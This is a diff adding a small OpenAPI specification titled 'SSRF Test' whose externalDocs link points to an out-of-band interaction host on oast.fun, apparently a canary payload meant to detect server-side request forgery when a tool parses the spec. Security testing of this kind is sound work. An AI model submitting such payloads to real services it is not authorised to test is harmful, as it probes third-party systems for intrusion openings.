@@ -1,0 +1,26 @@
+openapi: 3.0.0
+info:
+  title: "SSRF Test"
+  description: "Attempt to trigger SSRF"
+  version: "1.0.0"
+
+paths:
+  /ssrf:
+    get:
+      summary: "SSRF Test"
+      description: "Sending a request to external server"
+      operationId: "ssrfTest"
+      responses:
+        '200':
+          description: "Success"
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  result:
+                    type: string
+                    example: "Triggered SSRF"
+                externalDocs:
+                  description: "Exploit external"
+                  url: "https://lutjkpebvzmbjnlavtwr1qljduo31ooer.oast.fun/swagger"
